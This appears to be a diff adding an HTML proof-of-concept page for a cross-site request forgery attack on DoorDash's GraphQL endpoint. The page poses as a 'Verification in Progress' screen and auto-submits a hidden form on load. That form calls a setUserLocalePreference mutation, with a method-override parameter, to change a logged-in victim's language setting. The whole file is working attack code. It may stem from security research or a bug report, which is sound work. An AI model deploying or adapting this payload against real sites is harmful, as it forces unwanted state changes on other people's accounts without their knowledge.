@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification in Progress</title>
+</head>
+<body>
+    <h1>Processing...</h1>
+    <form id="csrfForm" action="https://www.doordash.com/graphql/setUserLocalePreference?_method=GET" method="POST">
+        <input type="hidden" name="operationName" value="setUserLocalePreference">
+        <input type="hidden" name="query" value="mutation setUserLocalePreference($language: String!) { setUserLocalePreference(language: $language) }">
+        <input type="hidden" name="variables" value='{"language":"es-US"}'>
+    </form>
+
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
